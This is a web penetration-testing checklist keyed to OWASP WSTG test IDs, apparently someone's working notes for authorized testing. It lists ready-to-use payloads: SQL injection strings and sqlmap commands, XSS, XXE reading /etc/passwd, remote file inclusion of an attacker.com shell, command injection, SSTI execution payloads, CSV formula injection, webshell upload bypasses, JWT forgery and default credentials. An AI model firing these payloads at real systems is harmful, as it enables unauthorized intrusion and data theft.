 OWASP Web Pentest Checklist (WSTG v4.2)

---

## 🔍 Reconnaissance

#### OSINT

- [ ]  Google Dork the target: `site:target.com`, `intitle:`, `inurl:`, `filetype:`, `intext:`
- [ ]  Check Google Cache for old/exposed pages: `cache:target.com`
- [ ]  Search GitHub / GitLab / Bitbucket for leaked source code, API keys, credentials
- [ ]  Check Shodan / Censys for exposed services and metadata
- [ ]  Use Wayback Machine for historical content and old endpoints
- [ ]  Search Pastebin / similar sites for leaked credentials or tokens
- [ ]  Check for exposed `.env`, `.git`, `.DS_Store`, `config.*` files

#### Web Server Fingerprinting (WSTG-INFO-02)

- [ ]  Grab HTTP response banner: `curl -I https://target.com`
- [ ]  Check `Server:` header and `X-Powered-By:` header for version info
- [ ]  Send malformed request to elicit error-based fingerprinting
- [ ]  Run `whatweb` or `wappalyzer` to identify stack
- [ ]  Run `nmap -sV -p 80,443,8080,8443 target.com` for service detection
- [ ]  Check for version-specific known CVEs on identified server version

#### Webserver Metafiles (WSTG-INFO-03)

- [ ]  Fetch and read `robots.txt` — note all `Disallow:` paths
- [ ]  Fetch `sitemap.xml` and enumerate all disclosed URLs
- [ ]  Check `/.well-known/security.txt` for contacts and bounty info
- [ ]  Check `humans.txt` for staff names, technologies
- [ ]  Inspect HTML `<META>` tags for framework, version, author leakage

#### Directory & File Enumeration (WSTG-INFO-04)

- [ ]  Run GoBuster/FFuF with a `directories` wordlist
- [ ]  Run GoBuster/FFuF with a `files` wordlist 
- [ ]  Always check `/dev`, `/test`, `/staging`, `/backup`, `/old`, `/archive`
- [ ]  If `/admin` found → run nested enum on it: `gobuster dir -u https://target.com/admin -w list.txt`
- [ ]  Nested enum on all other interesting directories found
- [ ]  Check common paths: `/api`, `/api/v1`, `/api/v2`, `/swagger`, `/graphql`, `/actuator`, `/console`
- [ ]  Check for exposed config/debug endpoints: `/.env`, `/.git/HEAD`, `/config.php.bak`, `/web.config`
- [ ]  Try appending extensions to known files: `index.php.bak`, `config.php~`
- [ ]  Test double extensions: `file.php.txt`, `shell.php.jpg`

#### Webpage Content Leakage (WSTG-INFO-05)

- [ ]  View page source — look for HTML comments `<!-- ... -->`
- [ ]  Check for commented-out credentials, SQL queries, internal IPs
- [ ]  Inspect JavaScript files for hardcoded API keys, secrets, internal routes
- [ ]  Check for source map files: append `.map` to JS files (e.g., `/main.chunk.js.map`)
- [ ]  Search JS for: passwords, tokens, AWS keys, internal URLs, admin paths
- [ ]  Check for verbose error messages revealing stack traces or paths

#### Application Entry Points (WSTG-INFO-06)

- [ ]  Map all GET/POST/PUT/DELETE parameters using Burp proxy
- [ ]  Note all hidden form fields
- [ ]  Identify cookies and their usage
- [ ]  Document all API endpoints
- [ ]  Identify WebSocket connections

#### Framework / Tech Fingerprinting (WSTG-INFO-08/09)

- [ ]  Identify framework via cookies (`PHPSESSID`, `JSESSIONID`, `ASP.NET_SessionId`, `laravel_session`, etc.)
- [ ]  Identify framework via headers and response patterns
- [ ]  Check `X-Generator`, `X-Framework`, `X-AspNet-Version` headers
- [ ]  Search for framework-specific files (e.g., `wp-login.php`, `joomla.xml`, `struts-config.xml`)

---

#### Network / Infrastructure Config (WSTG-CONF-01/02)

- [ ]  Run full port scan: `nmap -Pn -sV -p- target.com`
- [ ]  Check for unnecessary open ports / services
- [ ]  Identify staging or dev servers accessible from internet
- [ ]  Check for default server pages (Apache default, IIS welcome, nginx default)


#### Backup & Unreferenced Files (WSTG-CONF-04)

- [ ]  Check for backup files of known pages: `index.php~`, `login.bak`, `config.old`
- [ ]  Check common backup paths: `/backup/`, `/bak/`, `/_backup/`, `/old/`
- [ ]  Try common archive names: `backup.zip`, `www.tar.gz`, `site.sql`

#### Admin Interface Enumeration (WSTG-CONF-05)

- [ ]  Try common admin paths: `/admin`, `/administrator`, `/manage`, `/manager`, `/wp-admin`, `/phpmyadmin`, `/cpanel`, `/joomla/administrator`
- [ ]  Try admin on different ports: `:8080/admin`, `:8443/admin`, `:9090`
- [ ]  If admin found → test default credentials (see Login section)
- [ ]  Test for unauthenticated access to admin panels

#### HTTP Methods (WSTG-CONF-06)

- [ ]  Check allowed methods: `curl -X OPTIONS https://target.com -i`
- [ ]  Test `PUT` method to upload files
- [ ]  Test `DELETE` method on resources
- [ ]  Test `TRACE` method (XST vulnerability)
- [ ]  Test `PATCH` method for unintended modifications
- [ ]  Test HTTP verb tampering to bypass controls (e.g., use `HEAD` or `ARBITRARY`)

#### HTTP Strict Transport Security (WSTG-CONF-07)

- [ ]  Check if `Strict-Transport-Security` header is present
- [ ]  Verify `max-age` is at least 1 year (`max-age=31536000`)
- [ ]  Check if `includeSubDomains` flag is set
- [ ]  Test HTTP → HTTPS redirect

#### Subdomain Takeover (WSTG-CONF-10)

- [ ]  Enumerate subdomains: `subfinder`, `amass`, `assetfinder`
- [ ]  Check for dangling DNS CNAMEs pointing to unclaimed services (GitHub Pages, Heroku, S3, etc.)
- [ ]  Use `subjack` or `nuclei` to automate takeover checks

#### Cloud Storage (WSTG-CONF-11)

- [ ]  Check for public S3 buckets: `aws s3 ls s3://bucketname --no-sign-request`
- [ ]  Try common bucket names: `target-backup`, `target-assets`, `target-dev`
- [ ]  Check Azure Blob, GCP Storage for public access
- [ ]  Try listing bucket contents and uploading test files

---

## 1. 👤 Identity Management Testing

#### User Registration (WSTG-IDNT-02)

- [ ]  Test if username enumeration is possible during registration (different errors for taken vs. available)
- [ ]  Test if you can register with special chars, very long usernames, or email-like usernames
- [ ]  Test if registration allows duplicate users or role manipulation
- [ ]  Check if email verification is enforced

#### Account Enumeration (WSTG-IDNT-04)

- [ ]  Test login form: does it reveal if username exists? (different error messages)
- [ ]  Test password reset: does it reveal if email/username exists?
- [ ]  Test registration: does it reveal if username/email is taken?
- [ ]  Use timing differences to enumerate even with uniform messages
- [ ]  Brute-force common usernames if no lockout: `admin`, `administrator`, `root`, `test`, `guest`, `user`

---

## 2. 🔑 Authentication Testing

#### Credentials Over Encrypted Channel (WSTG-AUTHN-01)

- [ ]  Confirm login form submits over HTTPS
- [ ]  Check that credentials are NOT in the URL (GET params)
- [ ]  Confirm no credentials appear in server logs or referrer headers
- [ ]  Test if HTTP is redirected to HTTPS before credentials are submitted

#### Login Page — Full Attack Checklist (WSTG-AUTHN-02/03/04)

**Default Credentials**

- [ ]  Try `admin:admin`
- [ ]  Try `admin:password`
- [ ]  Try `admin:` (empty password)
- [ ]  Try `root:root`
- [ ]  Try `root:toor`
- [ ]  Try `root:` (empty password)
- [ ]  Try `administrator:administrator`
- [ ]  Try `test:test`
- [ ]  Try `guest:guest`
- [ ]  Search online for default creds specific to identified CMS/framework/device

**SQL Injection on Login**

- [ ]  Try `' OR '1'='1` in username field
- [ ]  Try `' OR '1'='1' --` in username field
- [ ]  Try `admin'--` in username field
- [ ]  Try `' OR 1=1--` in both fields
- [ ]  Try `" OR ""="` in username
- [ ]  Run SQLMap against login endpoint: `sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --level=3`

**Brute Force & Lockout**

- [ ]  Test lockout mechanism: does it lock after 3/5/10 failed attempts?
- [ ]  Test if lockout resets with different capitalization of username
- [ ]  Test if lockout applies per IP or per account
- [ ]  Test if lockout can be bypassed via `X-Forwarded-For` header spoofing
- [ ]  Test if lockout is bypassed by rotating IPs

**Timing Attacks**

- [ ]  Measure response time for valid vs. invalid usernames — look for timing difference
- [ ]  Use Burp Intruder "Response timing" to identify valid usernames

**Authentication Bypass**

- [ ]  Modify HTTP method (POST → GET)
- [ ]  Manipulate hidden fields (e.g., `role=user` → `role=admin`, `isAdmin=false` → `isAdmin=true`)
- [ ]  Try direct URL access to post-login pages without authenticating
- [ ]  Try changing `200 OK` after failed login to see if auth is client-side only
- [ ]  Test parameter pollution: `user=admin&user=attacker`

**Remember Me Functionality**

- [ ]  Check if "remember me" token is long, random, and cryptographically secure
- [ ]  Check if remember-me token is stored in a secure, HttpOnly cookie
- [ ]  Test if remember-me tokens can be reused after logout
- [ ]  Test if remember-me tokens expire after a reasonable period

**JWT Token Testing**

- [ ]  Decode token at `jwt.io` — check claims (role, user, exp)
- [ ]  Try `alg: none` attack: remove signature, change alg to `none`
- [ ]  Try algorithm confusion: RS256 → HS256 using the public key as the HMAC secret
- [ ]  Brute-force weak JWT secret: `hashcat -a 0 -m 16500 token.txt wordlist.txt`
- [ ]  Run `jwt_tool`: `python3 jwt_tool.py <token> -M at`
- [ ]  Test if exp claim is validated (replay expired token)
- [ ]  Test if JWT can be forged by modifying claims without signature validation
- [ ]  Check if sensitive data is stored in JWT payload without encryption

**Multi-Factor Authentication**

- [ ]  Test if MFA can be bypassed by directly accessing post-login URL
- [ ]  Test if MFA code is valid for more than one use
- [ ]  Test if MFA code doesn't expire
- [ ]  Test brute-force of MFA code (often 6-digit = 1,000,000 combos)
- [ ]  Test if MFA can be removed/disabled without current password

#### Password Policy (WSTG-AUTHN-07)

- [ ]  Test minimum length (OWASP recommends 8+ chars)
- [ ]  Test if common passwords are rejected (`password123`, `qwerty`, `abc123`)
- [ ]  Check if password is transmitted and stored securely (hashed + salted)
- [ ]  Test if password reuse is prevented on change

#### Security Questions (WSTG-AUTHN-08)

- [ ]  Check if security questions can be guessed or researched
- [ ]  Test for predictable answers to common questions
- [ ]  Check if security questions can be brute-forced (no lockout on this endpoint)


#### Forget Password Mechanism (WSTG-AUTHN-09)

- [ ]  Confirm response is identical for existing and non-existing accounts (no enumeration)
- [ ]  Measure response timing — no difference between valid/invalid account
- [ ]  Verify reset link/code is sent ONLY to the registered email (not in the response body or headers)
- [ ]  Confirm generated token is cryptographically random (not sequential or predictable)
- [ ]  Confirm token is sufficiently long (minimum 128-bit entropy)
- [ ]  Test if reset token expires after a short period (e.g., 15–60 minutes)
- [ ]  Test if reset token is single-use (try reusing the same link)
- [ ]  Test if multiple reset requests invalidate previous tokens
- [ ]  Confirm no change to the account occurs until valid token is presented
- [ ]  Test if you can modify the email address in the reset request to redirect link to attacker
- [ ]  Test Host header injection in password reset email: modify `Host:` header to `attacker.com`
- [ ]  Test for token leakage in the `Referer` header when clicking the reset link
- [ ]  Test if reset token is exposed in the URL (visible in server logs)
- [ ]  Test if account is locked before reset is completed (it should NOT be)

---

## 3. 🛡️ Authorization Testing

#### Directory Traversal (WSTG-ATHZ-01)

- [ ]  Try `../`, `..%2F`, `..%252F`, `....//` in file path parameters
- [ ]  Test inclusion of `/etc/passwd`, `C:\Windows\win.ini` via traversal
- [ ]  Test for LFI: `?file=../../../../etc/passwd`
- [ ]  Test for RFI: `?page=http://attacker.com/shell.php`
- [ ]  Fuzz path parameters with traversal payloads using Burp Intruder

#### Broken Access Control / IDOR (WSTG-ATHZ-02/04)

- [ ]  Access admin-only pages/functions as a regular user
- [ ]  Try modifying user IDs in URL/body: `?user_id=1` → `?user_id=2`
- [ ]  Try modifying object IDs in API calls: `/api/orders/1001` → `/api/orders/1002`
- [ ]  Test horizontal privilege escalation (access another user's data)
- [ ]  Test vertical privilege escalation (access higher-privileged functionality)
- [ ]  Test IDOR on file downloads: `?file=user1_invoice.pdf` → `?file=user2_invoice.pdf`
- [ ]  Test IDOR via GUIDs/UUIDs (don't assume they're safe)
- [ ]  Bypass authorization by changing request method (POST → GET)
- [ ]  Test path-based access control bypass: `/admin/` vs `/Admin/` vs `/admin/../admin/`

#### Privilege Escalation (WSTG-ATHZ-03)

- [ ]  Check if regular user can access admin APIs by guessing endpoints
- [ ]  Check if role/group parameter can be manipulated in requests
- [ ]  Test if cookie/token modification grants elevated privileges
- [ ]  Check if account registration allows setting privileged roles

---

## 4. 🍪 Session Management Testing

#### Session Token Analysis (WSTG-SESS-01)

- [ ]  Capture multiple session tokens and analyze for patterns (sequential, time-based, weak entropy)
- [ ]  Use Burp Sequencer to test randomness of session tokens
- [ ]  Check if session ID is in the URL (risk of leakage via logs/referer)
- [ ]  Verify session ID length is sufficient (128-bit minimum)
- [ ]  Test if session tokens are reused across sessions

#### Cookie Security (WSTG-SESS-02)

- [ ]  Check `HttpOnly` flag is set on session cookies
- [ ]  Check `Secure` flag is set on session cookies
- [ ]  Check `SameSite` attribute (`Strict` or `Lax` preferred)
- [ ]  Check cookie `Domain` is not overly broad (e.g., `.example.com`)
- [ ]  Check cookie `Path` is restricted where appropriate
- [ ]  Verify no sensitive data is stored in cookies unencrypted
- [ ]  Try decoding cookies (Base64) to inspect contents

#### Session Fixation (WSTG-SESS-03)

- [ ]  Check if session ID changes after successful login
- [ ]  Test setting a known session ID before login (via URL or cookie) — is it accepted post-auth?

#### CSRF (WSTG-SESS-05)

- [ ]  Identify all state-changing requests (POST/PUT/DELETE)
- [ ]  Check if CSRF token is present and validated on each request
- [ ]  Try removing CSRF token — does request succeed?
- [ ]  Try using an empty CSRF token
- [ ]  Try using another user's CSRF token
- [ ]  Check if `SameSite` cookie alone is relied upon (insufficient for older browsers)
- [ ]  Test CSRF on password change, email change, fund transfer, settings update

#### Logout & Session Timeout (WSTG-SESS-06/07)

- [ ]  Test if logout invalidates session server-side (replay old session cookie after logout)
- [ ]  Test if session expires after inactivity (idle timeout)
- [ ]  Test if session expires after absolute time (maximum lifetime)
- [ ]  Test if "logout all devices" function works and invalidates all sessions

#### Session Hijacking (WSTG-SESS-09)

- [ ]  Check for session token in URL (vulnerable to referer leakage)
- [ ]  Test XSS to steal session cookies (if HttpOnly is missing)
- [ ]  Check if session cookie is transmitted over HTTP (non-Secure flag)
- [ ]  Test for session token in custom headers that might be logged

---

## 5. 💉 Input Validation Testing

#### Cross-Site Scripting — Reflected (WSTG-INPV-01)

- [ ]  Test all input parameters with `<script>alert(1)</script>`
- [ ]  Test URL parameters, headers (`User-Agent`, `Referer`, `X-Forwarded-For`), form fields
- [ ]  Try encoded payloads: `%3Cscript%3Ealert(1)%3C/script%3E`
- [ ]  Try attribute injection: `" onmouseover="alert(1)` inside HTML attributes
- [ ]  Try event handlers: `<img src=x onerror=alert(1)>`
- [ ]  Test all error messages — do they reflect user input?

#### Cross-Site Scripting — Stored (WSTG-INPV-02)

- [ ]  Test all input fields that store and display data (comments, profiles, bio, notes, usernames)
- [ ]  Test rich-text editors for XSS bypass (try SVG, MathML, CSS injection)
- [ ]  Check if stored XSS triggers in admin panel (high-impact)
- [ ]  Use Burp Collaborator to detect blind XSS

#### DOM-Based XSS (WSTG-CLNT-01)

- [ ]  Review JavaScript for dangerous sinks: `innerHTML`, `document.write`, `eval`, `setTimeout`
- [ ]  Test URL fragments (`#`) and how they're processed client-side
- [ ]  Use DOM Invader (Burp) to detect DOM XSS

#### HTTP Verb Tampering (WSTG-INPV-03)

- [ ]  Try `GET` instead of `POST` for state-changing operations
- [ ]  Try `HEAD`, `OPTIONS`, `PUT`, `DELETE` to bypass access controls
- [ ]  Test if authorization checks are method-specific

#### HTTP Parameter Pollution (WSTG-INPV-04)

- [ ]  Duplicate parameters: `?id=1&id=2` — which does the server use?
- [ ]  Test for WAF bypass via parameter pollution
- [ ]  Test in both GET query string and POST body

#### SQL Injection (WSTG-INPV-05)

- [ ]  Test all parameters for SQL injection:
    - [ ]  Single quote: `'`
    - [ ]  Double quote: `"`
    - [ ]  Comment: `'--`, `'#`, `' /*`
    - [ ]  Boolean: `' OR '1'='1`, `' AND '1'='2`
    - [ ]  UNION: `' UNION SELECT NULL--`
    - [ ]  Time-based: `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `' OR SLEEP(5)--` (MySQL)
    - [ ]  Error-based: `' AND 1=CONVERT(int,(SELECT TOP 1 TABLE_NAME FROM information_schema.tables))--`
- [ ]  Test login, search, sort, filter, order by, pagination parameters
- [ ]  Test cookie values, HTTP headers, and hidden fields
- [ ]  Run `sqlmap` for automated detection: `sqlmap -u "https://target.com/page?id=1" --dbs`
- [ ]  Test for NoSQL injection: `{"user": {"$gt": ""}, "pass": {"$gt": ""}}`

#### LDAP Injection (WSTG-INPV-06)

- [ ]  Test LDAP-related fields with: `*`, `)(`, `*))(|(`, `admin)(&)`, `*)(uid=*)`
- [ ]  Test login fields if LDAP auth is suspected

#### Json File 
- [ ]  always check with a correct request  difference key and value  if there is couple of id check for idor
- [ ] if there is severale id keys check which one does it relate
- [ ]  if there is an ID
	- [ ]  try IDOR
	- [ ]  check if we can  if its replate ot document chech one is the effective ID for that document 
		- [ ] if so check if you can change that particular one and leave the others 
#### XML Injection / XXE (WSTG-INPV-07)

- [ ]  Test XML input fields for XXE:

xml

```xml
  <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
```

- [ ]  Test file upload endpoints that accept XML/DOCX/XLSX/SVG formats
- [ ]  Test for blind XXE via out-of-band (Burp Collaborator)
- [ ]  Test SSRF via XXE: `<!ENTITY xxe SYSTEM "http://attacker.com/">`

#### Command Injection (WSTG-INPV-12)

- [ ]  Test OS command injection in all input fields:
    - [ ]  `; ls`
    - [ ]  `| id`
    - [ ]  `&& whoami`
    - [ ]  `` `id` ``
    - [ ]  `$(id)`
    - [ ]  `; ping -c 1 attacker.com`
- [ ]  Target fields likely to invoke OS commands: IP input, hostname, filename, email, ping, traceroute fields
- [ ]  Use blind injection: `; sleep 5` — check for response delay
- [ ]  Use Burp Collaborator for out-of-band OS command injection detection

#### Path Traversal / File Inclusion (WSTG-INPV-11)

- [ ]  LFI: `?page=../../../../etc/passwd`, `?file=../../../windows/win.ini`
- [ ]  Try PHP wrappers: `?page=php://filter/convert.base64-encode/resource=index.php`
- [ ]  Try `expect://id`, `data://text/plain;base64,...`
- [ ]  RFI: `?page=http://attacker.com/shell.php` (PHP allow_url_include must be on)
- [ ]  Test log poisoning for LFI→RCE: inject PHP in User-Agent, then include access log

#### Server-Side Template Injection (WSTG-INPV-18)

- [ ]  Test for SSTI with: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`
- [ ]  If `49` is returned — SSTI confirmed, identify template engine
- [ ]  For Jinja2: `{{config.items()}}`, `{{''.__class__.__mro__}}`
- [ ]  For Twig: `{{_self.env.displayVar('id')}}`
- [ ]  For Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- [ ]  Use `tplmap` for automated SSTI exploitation

#### Server-Side Request Forgery (WSTG-INPV-19)

- [ ]  Identify URL parameters, webhook URLs, import functions, PDF generators, image fetchers
- [ ]  Test with internal IPs: `http://127.0.0.1/admin`, `http://localhost:8080`
- [ ]  Test cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal`
- [ ]  Test for SSRF via Referer, Host, X-Forwarded-For headers
- [ ]  Test blind SSRF with Burp Collaborator
- [ ]  Try protocol switching: `file://`, `gopher://`, `dict://`, `ftp://`
- [ ]  Test SSRF bypass: `http://127.0.0.1:80`, `http://[::1]`, `http://0.0.0.0`, `http://2130706433`

#### Host Header Injection (WSTG-INPV-17)

- [ ]  Inject malicious host in `Host:` header on password reset → check if reset link points to attacker host
- [ ]  Test `X-Forwarded-Host:`, `X-Host:`, `X-Forwarded-Server:` headers
- [ ]  Test cache poisoning via Host header

#### HTML / CSV / Formula Injection

- [ ]  Test HTML injection in all input fields
- [ ]  Test CSV injection in exported data: `=cmd|' /C calc'!A0`, `=HYPERLINK("http://evil.com","click")`
- [ ]  Test in fields that appear in email, reports, or CSV exports

---

## 6. 🚨 Error Handling

#### Improper Error Handling (WSTG-ERRH-01/02)

- [ ]  Trigger application errors: SQL errors, 404, 500, method not allowed
- [ ]  Check if stack traces, file paths, SQL queries, or framework info are exposed
- [ ]  Test with unexpected input types (array instead of string, negative numbers, very long strings)
- [ ]  Verify custom error pages are shown (not default framework/server error pages)
- [ ]  Check if errors reveal internal IP addresses or server paths

---

## 7. 🔐 Cryptography Testing

#### Weak TLS (WSTG-CRYP-01)

- [ ]  Run `testssl.sh` or `sslyze` against the target
- [ ]  Check for SSLv2, SSLv3, TLS 1.0, TLS 1.1 support (should be disabled)
- [ ]  Check for weak ciphers (RC4, DES, 3DES, EXPORT)
- [ ]  Verify certificate is valid, not self-signed, and not expired
- [ ]  Check for certificate chain completeness
- [ ]  Test BEAST, POODLE, LOGJAM, HEARTBLEED, DROWN if old TLS versions are supported

#### Padding Oracle (WSTG-CRYP-02)

- [ ]  Identify encrypted tokens or cookies
- [ ]  Test by modifying ciphertext byte by byte — look for different error responses
- [ ]  Use `padbuster` if padding oracle suspected

#### Sensitive Data Over HTTP (WSTG-CRYP-03)

- [ ]  Verify passwords, tokens, PII are never transmitted over plain HTTP
- [ ]  Check if sensitive data appears in server logs, URL parameters, or referrer
- [ ]  Verify API keys are not exposed in client-side code or responses

#### Weak Encryption (WSTG-CRYP-04)

- [ ]  Check for use of MD5 or SHA1 for password hashing (should be bcrypt/argon2/scrypt)
- [ ]  Check if encryption is reversible when it shouldn't be
- [ ]  Check for hardcoded encryption keys in source code or JS files
- [ ]  Test if tokens are base64-encoded without actual encryption (false security)

---

## 8. 🧠 Business Logic Testing

#### Data Validation Logic (WSTG-BUSL-01)

- [ ]  Test negative values in quantity/price fields: `quantity=-1`
- [ ]  Test zero values: `price=0`, `quantity=0`
- [ ]  Test extremely large values (integer overflow)
- [ ]  Test applying discounts multiple times
- [ ]  Modify prices in client-side requests: `price=0.01`

#### Request Forgery / Flow Tampering (WSTG-BUSL-02)

- [ ]  Test if steps in multi-step processes can be skipped (go directly to step 3 from step 1)
- [ ]  Test if parameters from step 1 can be reused in step 3
- [ ]  Test if you can access the final confirmation step without completing prerequisites

#### Integrity Checks (WSTG-BUSL-03)

- [ ]  Test if data modified in transit is detected
- [ ]  Check for client-side integrity controls that can be bypassed
- [ ]  Modify shopping cart totals, coupon values, shipping costs in intercepted requests

#### Function Usage Limits (WSTG-BUSL-05)

- [ ]  Test if rate limiting is enforced on coupon/voucher redemption
- [ ]  Test if a coupon can be used more than once
- [ ]  Test if a referral can be self-referred
- [ ]  Test if file upload limits can be bypassed

#### File Upload Testing (WSTG-BUSL-08/09)

- [ ]  Upload PHP/ASP/ASPX webshell and test execution
- [ ]  Test MIME type bypass: change `Content-Type` to `image/jpeg` while uploading `.php`
- [ ]  Test extension bypass: `shell.php.jpg`, `shell.php%00.jpg`, `shell.PhP`
- [ ]  Test double extension: `shell.jpg.php`
- [ ]  Test for directory traversal in filename: `../../shell.php`
- [ ]  Test for malicious content in SVG, XML, DOCX files (XXE)
- [ ]  Test if uploaded files are accessible via a predictable URL
- [ ]  Test polyglot files (valid image AND valid PHP)
- [ ]  Check if file content is validated (not just extension/MIME)

---

## 9. 💻 Client-Side Testing

#### Clickjacking (WSTG-CLNT-09)

- [ ]  Check for `X-Frame-Options: DENY` or `SAMEORIGIN` header
- [ ]  Check for `Content-Security-Policy: frame-ancestors 'none'` header
- [ ]  Test by embedding the site in an iframe on an external page

#### CORS Misconfiguration (WSTG-CLNT-07)

- [ ]  Send request with `Origin: https://evil.com` — check if reflected in `Access-Control-Allow-Origin`
- [ ]  Check if `Access-Control-Allow-Credentials: true` is combined with a dynamic/reflected origin
- [ ]  Test null origin: `Origin: null`
- [ ]  Test subdomain: `Origin: https://evil.target.com`
- [ ]  Test for wildcard `*` on sensitive endpoints

#### Browser Storage (WSTG-CLNT-12)

- [ ]  Check `localStorage` and `sessionStorage` for sensitive data (tokens, PII, credentials)
- [ ]  Check `IndexedDB` for sensitive data
- [ ]  Check if session tokens in storage are accessible to JS (not HttpOnly)

#### Web Messaging (WSTG-CLNT-11)

- [ ]  Check `postMessage` handlers for missing origin validation
- [ ]  Test if malicious messages can be sent from a cross-origin window

#### WebSockets (WSTG-CLNT-10)

- [ ]  Check if WebSocket connection requires authentication
- [ ]  Test for injection (SQLi, XSS, command injection) in WebSocket messages
- [ ]  Test if WebSocket origin is validated (CSWSH — Cross-Site WebSocket Hijacking)
- [ ]  Check if WebSocket traffic is over WSS (secure)

---

## 10. 🔌 API Testing

#### GraphQL (WSTG-APIT-01)

- [ ]  Check if introspection is enabled: `{__schema{types{name}}}`
- [ ]  Enumerate all types, queries, mutations using introspection
- [ ]  Test for authorization issues on individual queries/mutations
- [ ]  Test for batch query abuse (rate limit bypass via batching)
- [ ]  Test for injection in GraphQL variables
- [ ]  Check for field suggestions (hints about valid fields even without introspection)

#### REST API

- [ ]  Test all HTTP methods on each endpoint
- [ ]  Test for IDOR in API resource IDs
- [ ]  Test for mass assignment (send extra fields not expected by API)
- [ ]  Test for excessive data exposure (API returns more data than needed)
- [ ]  Check if API versioning exposes older, less-secured endpoints (`/api/v1/` vs `/api/v2/`)
- [ ]  Test unauthenticated access to authenticated endpoints
- [ ]  Fuzz API parameters for injection vulnerabilities

---

## 11. 🔎 Supplemental Checks (Always Run)

#### Security Headers

- [ ]  Check `Content-Security-Policy` header
- [ ]  Check `X-Content-Type-Options: nosniff`
- [ ]  Check `X-Frame-Options`
- [ ]  Check `Referrer-Policy`
- [ ]  Check `Permissions-Policy`
- [ ]  Check `Cache-Control` on sensitive pages

#### Sensitive Data Exposure

- [ ]  Check if PII is returned in API responses unnecessarily
- [ ]  Check if sensitive fields (password, CVV, SSN) are masked in responses
- [ ]  Verify financial/health data is not exposed to unauthorized users
- [ ]  Check if verbose logging exposes secrets

#### Rate Limiting & DoS

- [ ]  Test rate limiting on login, registration, password reset, OTP endpoints
- [ ]  Test for resource exhaustion (large file upload, deeply nested JSON)
- [ ]  Test account lockout consistency across all authentication methods**


#### VM 
- [ ]  Windows Task Manager (press CTRL+ALT+DEL or CTRL+ALT+END, select the Task Manager, and then access File > Run new task > cmd.exe)
- [ ]  Windows sticky keys (press the shift key 5 times to access a hidden menu and the Control Panel)



### Reference

- https://www.pentest-book.com/others/web-checklist
- OWASP PDF
- Hacktricks